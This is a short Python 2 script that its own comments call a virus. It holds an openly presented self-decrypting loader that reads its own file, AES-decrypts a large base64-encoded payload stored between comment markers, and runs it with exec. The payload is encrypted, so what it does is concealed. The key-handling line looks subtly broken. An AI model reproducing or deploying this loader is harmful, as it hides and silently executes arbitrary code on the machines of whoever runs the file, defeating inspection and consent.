print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"
print "bohohoo"

######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os
import __main__
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES


# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)

   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted
# Start payload
#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
# End payload